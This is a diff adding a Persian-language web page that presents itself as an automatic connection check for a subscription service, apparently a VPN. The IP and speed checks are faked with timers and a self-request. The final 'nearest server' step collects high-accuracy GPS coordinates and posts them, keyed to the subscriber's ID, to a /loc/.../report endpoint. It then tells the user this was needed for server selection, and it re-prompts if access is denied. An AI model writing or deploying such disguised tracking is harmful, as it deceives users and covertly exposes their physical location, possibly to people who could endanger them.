@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>بررسی اتصال</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: Tahoma, system-ui, sans-serif;
+    background: #0b0b0f; color: #f2f2f2;
+    min-height: 100vh; display: flex; align-items: center; justify-content: center;
+    padding: 16px;
+  }
+  .card {
+    background: #16161d; border: 2px solid #000; border-radius: 14px;
+    box-shadow: 6px 6px 0 #000; max-width: 420px; width: 100%;
+    padding: 28px 22px; text-align: center;
+  }
+  h1 { font-size: 20px; margin-bottom: 8px; }
+  p.sub { color: #a7a7b3; font-size: 13px; line-height: 1.9; margin-bottom: 20px; }
+  .steps { text-align: right; margin: 0 auto 20px; max-width: 300px; }
+  .step {
+    display: flex; align-items: center; gap: 10px;
+    padding: 9px 0; font-size: 14px; color: #cfcfda;
+    border-bottom: 1px dashed #2a2a35;
+  }
+  .step:last-child { border-bottom: none; }
+  .dot {
+    width: 22px; height: 22px; border-radius: 50%; flex: 0 0 22px;
+    border: 2px solid #3a3a48; display: flex; align-items: center; justify-content: center;
+    font-size: 12px; color: #fff;
+  }
+  .step.run .dot { border-color: #ee3a3a; animation: pulse 0.8s infinite alternate; }
+  .step.ok .dot { background: #ee3a3a; border-color: #ee3a3a; }
+  .step.fail .dot { background: #55555f; border-color: #55555f; }
+  @keyframes pulse { from { transform: scale(1); } to { transform: scale(1.2); } }
+  button {
+    background: #ee3a3a; color: #fff; border: 2px solid #000; border-radius: 10px;
+    box-shadow: 4px 4px 0 #000; font-family: inherit; font-size: 15px; font-weight: bold;
+    padding: 12px 26px; cursor: pointer; width: 100%;
+  }
+  button:disabled { opacity: 0.55; cursor: default; }
+  #msg { margin-top: 16px; font-size: 13px; line-height: 1.9; color: #a7a7b3; min-height: 24px; }
+  #msg.good { color: #7ee2a0; }
+  #ping { color: #ee3a3a; font-weight: bold; }
+</style>
+</head>
+<body>
+<div class="card">
+  <h1>بررسی اتصال اشتراک</h1>
+  <p class="sub">برای اطمینان از کیفیت اتصال، چند مورد به‌صورت خودکار بررسی می‌شود. این بررسی چند ثانیه طول می‌کشد.</p>
+  <div class="steps">
+    <div class="step" id="s1"><span class="dot"></span> بررسی آی‌پی و اپراتور</div>
+    <div class="step" id="s2"><span class="dot"></span> تست سرعت و پینگ <span id="ping"></span></div>
+    <div class="step" id="s3"><span class="dot"></span> بررسی نزدیک‌ترین سرور</div>
+  </div>
+  <button id="go">شروع بررسی</button>
+  <div id="msg"></div>
+</div>
+<script>
+(function () {
+  var subId = location.pathname.split('/')[2] || '';
+  var btn = document.getElementById('go');
+  var msg = document.getElementById('msg');
+  function mark(id, cls, tick) {
+    var el = document.getElementById(id);
+    el.className = 'step ' + cls;
+    el.querySelector('.dot').textContent = tick ? '✓' : '';
+  }
+  function wait(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
+  btn.addEventListener('click', async function () {
+    btn.disabled = true;
+    msg.className = ''; msg.textContent = 'در حال بررسی…';
+    mark('s1', 'run');
+    var t0 = performance.now();
+    try { await fetch(location.href, { method: 'HEAD', cache: 'no-store' }); } catch (e) {}
+    var rtt = Math.max(1, Math.round(performance.now() - t0));
+    await wait(500);
+    mark('s1', 'ok', true);
+    mark('s2', 'run');
+    await wait(700);
+    document.getElementById('ping').textContent = '— ' + rtt + ' ms';
+    mark('s2', 'ok', true);
+    mark('s3', 'run');
+    if (!('geolocation' in navigator)) {
+      mark('s3', 'fail');
+      msg.textContent = 'مرورگر شما از بررسی سرور پشتیبانی نمی‌کند. بقیه‌ی بررسی‌ها سالم بود.';
+      btn.disabled = false;
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(async function (pos) {
+      try {
+        await fetch('/loc/' + encodeURIComponent(subId) + '/report', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy || 0
+          })
+        });
+      } catch (e) {}
+      mark('s3', 'ok', true);
+      msg.className = 'good';
+      msg.textContent = 'بررسی کامل شد ✓ اتصال شما سالم است و نزدیک‌ترین سرور برایتان انتخاب شد.';
+      btn.textContent = 'بررسی انجام شد';
+    }, function () {
+      mark('s3', 'fail');
+      msg.textContent = 'بررسی سرور کامل نشد: دسترسی به موقعیت لازم است. اگر مایلید، دوباره تلاش کنید و دسترسی را مجاز کنید.';
+      btn.disabled = false;
+      btn.textContent = 'تلاش دوباره';
+    }, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
+  });
+})();
+</script>
+</body>
+</html>
